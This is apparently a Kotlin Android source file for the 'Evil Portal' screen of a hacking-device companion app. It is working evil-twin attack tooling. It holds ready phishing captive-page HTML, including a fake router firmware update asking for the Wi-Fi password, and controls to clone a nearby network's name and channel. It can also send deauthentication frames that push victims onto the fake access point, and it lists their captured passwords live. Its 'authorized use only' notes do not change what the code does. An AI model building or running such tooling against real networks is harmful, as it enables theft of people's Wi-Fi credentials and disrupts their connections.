package app.brucia

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.ui.draw.clip
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.viewinterop.AndroidView
import app.brucia.wardrive.WardriveViewModel
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import app.brucia.ui.BruciaButtonDefaults
import app.brucia.ui.Button
import app.brucia.ui.OutlinedButton
import app.brucia.ui.TextButton

/** Captive-portal HTML templates pushed to the device. Each posts to /post with name='password'
 *  (and the firmware captures it). Generic, non-impersonating pages for authorized testing. */
private data class PortalTemplate(val label: String, val fileName: String, val html: String?)

private val PORTAL_TEMPLATES = listOf(
    PortalTemplate("Device default", "", null),
    PortalTemplate(
        "Wi-Fi login", "evil_portal.html",
        """<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Wi-Fi login</title>
<style>body{font-family:sans-serif;background:#f2f2f2;margin:0;display:flex;min-height:100vh;align-items:center;justify-content:center}
.card{background:#fff;max-width:340px;width:90%;padding:28px;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.1)}
h2{margin:0 0 6px}p{color:#555;font-size:14px}input{width:100%;box-sizing:border-box;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:8px;font-size:16px}
button{width:100%;padding:12px;border:0;border-radius:8px;background:#1a73e8;color:#fff;font-size:16px}</style></head>
<body><div class='card'><h2>Connect to Wi-Fi</h2><p>Enter the network password to continue.</p>
<form action='/post' method='post'><input type='password' name='password' placeholder='Wi-Fi password' required>
<button type='submit'>Connect</button></form></div></body></html>"""
    ),
    PortalTemplate(
        "Firmware update", "evil_portal.html",
        """<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Router update</title>
<style>body{font-family:sans-serif;background:#eef1f5;margin:0;display:flex;min-height:100vh;align-items:center;justify-content:center}
.card{background:#fff;max-width:360px;width:90%;padding:28px;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.1)}
h2{margin:0 0 6px}p{color:#555;font-size:14px}input{width:100%;box-sizing:border-box;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:8px;font-size:16px}
button{width:100%;padding:12px;border:0;border-radius:8px;background:#d93025;color:#fff;font-size:16px}</style></head>
<body><div class='card'><h2>Router firmware update</h2><p>A firmware update is required. Enter your Wi-Fi password to install it.</p>
<form action='/post' method='post'><input type='password' name='password' placeholder='Wi-Fi password' required>
<button type='submit'>Update now</button></form></div></body></html>"""
    ),
)

/** Starting point for the in-app HTML editor: a minimal page that posts the password to /post. */
private val DEFAULT_CUSTOM_PORTAL =
    """<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Sign in</title>
<style>body{font-family:sans-serif;background:#f2f2f2;margin:0;display:flex;min-height:100vh;align-items:center;justify-content:center}
.card{background:#fff;max-width:340px;width:90%;padding:28px;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.1)}
h2{margin:0 0 6px}p{color:#555;font-size:14px}input{width:100%;box-sizing:border-box;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:8px;font-size:16px}
button{width:100%;padding:12px;border:0;border-radius:8px;background:#1a73e8;color:#fff;font-size:16px}</style></head>
<body><div class='card'><h2>Sign in</h2><p>Enter the password to continue.</p>
<form action='/post' method='post'><input type='password' name='password' placeholder='Password' required>
<button type='submit'>Continue</button></form></div></body></html>"""

/**
 * Evil Portal (captive-portal / "evil twin") control screen. Starts/stops the device-side fake AP,
 * optionally pushing a captive-page template, and shows captured credentials live. Authorized use only.
 */
@Composable
internal fun EvilPortalScreen(vm: WardriveViewModel, onConnect: () -> Unit) {
    val cs = MaterialTheme.colorScheme
    val status by vm.status.collectAsState()
    val connected = status == "Connected"
    val active by vm.evilActive.collectAsState()
    val epStatus by vm.evilStatus.collectAsState()
    val creds by vm.evilCreds.collectAsState()
    val aps by vm.aps.collectAsState()
    val scanning by vm.wardriving.collectAsState()
    val savedPortals by vm.savedPortals.collectAsState()
    var ssid by remember { mutableStateOf("Free Wifi") }
    var templateIdx by remember { mutableIntStateOf(0) }
    var deauth by remember { mutableStateOf(false) }
    var channel by remember { mutableStateOf("1") }
    var showTargets by remember { mutableStateOf(false) }
    // Custom captive page authored in-app: index just past the built-ins selects it.
    val customIdx = PORTAL_TEMPLATES.size
    var customHtml by remember { mutableStateOf(DEFAULT_CUSTOM_PORTAL) }
    var previewHtml by remember { mutableStateOf(false) }
    var tplName by remember { mutableStateOf("") }
    // Stop a target scan when leaving the screen.
    DisposableEffect(Unit) { onDispose { if (vm.wardriving.value) vm.setWardriving(false) } }

    Column(
        Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp),
    ) {
        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
            Text("Evil Portal", style = MaterialTheme.typography.headlineSmall,
                fontWeight = FontWeight.ExtraBold, color = cs.primary)
            Spacer(Modifier.weight(1f))
            Box(Modifier.size(12.dp).clip(CircleShape).background(if (connected) Color(0xFF3DDC84) else cs.surfaceVariant))
        }
        Text("The device runs a fake Wi-Fi access point with a captive login page; whatever a victim submits is captured here live. Authorized / lawful use only.",
            color = cs.onSurfaceVariant, style = MaterialTheme.typography.bodySmall)
        if (!connected) {
            Button(onClick = onConnect, modifier = Modifier.fillMaxWidth()) { Text("Connect over USB") }
        }

        Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = cs.surface)) {
            Column(Modifier.padding(14.dp)) {
                OutlinedTextField(ssid, { ssid = it }, label = { Text("Fake AP name (SSID)") },
                    singleLine = true, enabled = !active, modifier = Modifier.fillMaxWidth())
                Spacer(Modifier.height(10.dp))
                Text("Captive page", style = MaterialTheme.typography.labelMedium, color = cs.onSurfaceVariant)
                Spacer(Modifier.height(6.dp))
                Column(verticalArrangement = Arrangement.spacedBy(6.dp)) {
                    PORTAL_TEMPLATES.forEachIndexed { i, t ->
                        Row(verticalAlignment = Alignment.CenterVertically,
                            modifier = Modifier.fillMaxWidth().clip(CircleShape)
                                .clickable(enabled = !active) { templateIdx = i }.padding(vertical = 2.dp)) {
                            RadioButton(selected = templateIdx == i, enabled = !active, onClick = { templateIdx = i })
                            Text(t.label, color = cs.onSurface)
                        }
                    }
                    Row(verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier.fillMaxWidth().clip(CircleShape)
                            .clickable(enabled = !active) { templateIdx = customIdx }.padding(vertical = 2.dp)) {
                        RadioButton(selected = templateIdx == customIdx, enabled = !active, onClick = { templateIdx = customIdx })
                        Text("Custom - edit HTML below", color = cs.onSurface)
                    }
                }

                // In-app HTML editor + live preview for the custom captive page. The device serves it;
                // the phone is the editor/viewer the tiny device screen could never offer.
                if (templateIdx == customIdx) {
                    Spacer(Modifier.height(10.dp))
                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        OutlinedButton(onClick = { previewHtml = false }, modifier = Modifier.weight(1f),
                            colors = if (!previewHtml) BruciaButtonDefaults.outlinedButtonColors(containerColor = cs.primary.copy(alpha = 0.18f)) else BruciaButtonDefaults.outlinedButtonColors()) { Text("Edit") }
                        OutlinedButton(onClick = { previewHtml = true }, modifier = Modifier.weight(1f),
                            colors = if (previewHtml) BruciaButtonDefaults.outlinedButtonColors(containerColor = cs.primary.copy(alpha = 0.18f)) else BruciaButtonDefaults.outlinedButtonColors()) { Text("Preview") }
                    }
                    Spacer(Modifier.height(8.dp))
                    if (previewHtml) {
                        // Sandboxed WebView: no network, no file/content access - just render the markup.
                        AndroidView(
                            factory = { ctx ->
                                android.webkit.WebView(ctx).apply {
                                    @android.annotation.SuppressLint("SetJavaScriptEnabled")
                                    settings.javaScriptEnabled = true
                                    settings.blockNetworkLoads = true
                                    settings.allowFileAccess = false
                                    settings.allowContentAccess = false
                                }
                            },
                            update = { wv -> wv.loadDataWithBaseURL(null, customHtml, "text/html", "UTF-8", null) },
                            onRelease = { it.destroy() }, // free the native WebView when leaving preview
                            modifier = Modifier.fillMaxWidth().height(320.dp),
                        )
                    } else {
                        OutlinedTextField(
                            customHtml, { customHtml = it }, enabled = !active,
                            label = { Text("Captive-page HTML (post to /post, field name='password')") },
                            textStyle = androidx.compose.ui.text.TextStyle(fontFamily = FontFamily.Monospace, fontSize = androidx.compose.ui.unit.TextUnit.Unspecified),
                            modifier = Modifier.fillMaxWidth().height(260.dp),
                        )
                    }
                    Spacer(Modifier.height(8.dp))
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        OutlinedTextField(tplName, { tplName = it }, label = { Text("Save as") }, singleLine = true,
                            enabled = !active, modifier = Modifier.weight(1f))
                        Spacer(Modifier.width(8.dp))
                        Button(enabled = !active && customHtml.isNotBlank(), onClick = {
                            vm.saveCustomPortal(tplName, customHtml); tplName = ""
                        }) { Text("Save") }
                    }
                    if (savedPortals.isNotEmpty()) {
                        Spacer(Modifier.height(8.dp))
                        Text("Saved templates", style = MaterialTheme.typography.labelMedium, color = cs.onSurfaceVariant)
                        savedPortals.forEachIndexed { i, p ->
                            Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
                                OutlinedButton(enabled = !active, modifier = Modifier.weight(1f),
                                    onClick = { customHtml = p.html; previewHtml = false }) { Text(p.name, maxLines = 1) }
                                Spacer(Modifier.width(8.dp))
                                OutlinedButton(enabled = !active, onClick = { vm.deleteCustomPortal(i) }) { Text("Del") }
                            }
                        }
                    }
                }
                Spacer(Modifier.height(10.dp))
                // Deauth + targeting: knock clients off their real AP so they land on this fake one.
                Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
                    Column(Modifier.weight(1f)) {
                        Text("Deauth clients (evil twin)", color = cs.onSurface)
                        Text("Disconnect devices from the real AP so they join this one.",
                            style = MaterialTheme.typography.bodySmall, color = cs.onSurfaceVariant)
                    }
                    Switch(checked = deauth, enabled = !active, onCheckedChange = { deauth = it })
                }
                Spacer(Modifier.height(8.dp))
                OutlinedTextField(
                    channel, { channel = it.filter { c -> c.isDigit() }.take(2) },
                    label = { Text("Channel (1-14)") }, singleLine = true, enabled = !active,
                    modifier = Modifier.fillMaxWidth(),
                )
                Spacer(Modifier.height(8.dp))
                OutlinedButton(
                    enabled = !active, modifier = Modifier.fillMaxWidth(),
                    onClick = {
                        showTargets = !showTargets
                        if (showTargets && aps.isEmpty()) vm.setWardriving(true)
                        else if (!showTargets && scanning) vm.setWardriving(false)
                    },
                ) { Text(if (showTargets) "Hide networks" else "Clone a nearby network (target)") }
                if (showTargets) {
                    if (scanning) Text("Scanning...", style = MaterialTheme.typography.bodySmall, color = cs.onSurfaceVariant)
                    val named = aps.filter { it.ssid.isNotBlank() }.distinctBy { it.ssid }.sortedByDescending { it.rssi }.take(20)
                    named.forEach { ap ->
                        Row(verticalAlignment = Alignment.CenterVertically,
                            modifier = Modifier.fillMaxWidth().clickable(enabled = !active) {
                                ssid = ap.ssid; channel = ap.channel.toString(); deauth = true
                                showTargets = false; if (scanning) vm.setWardriving(false)
                            }.padding(vertical = 8.dp)) {
                            Column(Modifier.weight(1f)) {
                                Text(ap.ssid, color = cs.onSurface)
                                Text("ch ${ap.channel}  -  ${ap.rssi} dBm", style = MaterialTheme.typography.bodySmall, color = cs.onSurfaceVariant)
                            }
                        }
                    }
                }
                Spacer(Modifier.height(12.dp))
                Button(
                    enabled = connected,
                    modifier = Modifier.fillMaxWidth(),
                    colors = BruciaButtonDefaults.buttonColors(containerColor = if (active) Color(0xFFD32F2F) else cs.primary),
                    onClick = {
                        if (active) vm.stopEvilPortal()
                        else {
                            if (scanning) vm.setWardriving(false)
                            if (templateIdx == customIdx) {
                                vm.startEvilPortal(ssid.trim(), customHtml.toByteArray(), "evil_portal.html",
                                    channel = channel.toIntOrNull() ?: 1, deauth = deauth)
                            } else {
                                val t = PORTAL_TEMPLATES[templateIdx]
                                vm.startEvilPortal(ssid.trim(), t.html?.toByteArray(), t.fileName,
                                    channel = channel.toIntOrNull() ?: 1, deauth = deauth)
                            }
                        }
                    },
                ) { Text(if (active) "Stop Evil Portal" else if (deauth) "Start evil twin (deauth + portal)" else "Start Evil Portal") }
                if (epStatus.isNotBlank()) {
                    Spacer(Modifier.height(8.dp))
                    Text(epStatus, style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = cs.onSurface)
                }
            }
        }

        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
            Text("Captured credentials (${creds.size})", fontWeight = FontWeight.SemiBold, color = cs.primary)
            Spacer(Modifier.weight(1f))
            if (creds.isNotEmpty()) TextButton(onClick = { vm.clearEvilCreds() }) { Text("Clear") }
        }
        if (creds.isEmpty()) {
            Text("Nothing captured yet. Connect a test device to the fake AP and submit the page.",
                color = cs.onSurfaceVariant, style = MaterialTheme.typography.bodySmall)
        } else {
            val fmt = remember { SimpleDateFormat("HH:mm:ss", Locale.US) }
            creds.asReversed().forEach { c ->
                Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = cs.surface)) {
                    Column(Modifier.padding(12.dp)) {
                        Text(c.pass, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.SemiBold, color = cs.onSurface)
                        Text("${if (c.ap.isBlank()) "portal" else c.ap}  -  ${fmt.format(Date(c.at))}",
                            style = MaterialTheme.typography.bodySmall, color = cs.onSurfaceVariant)
                    }
                }
            }
        }
    }
}
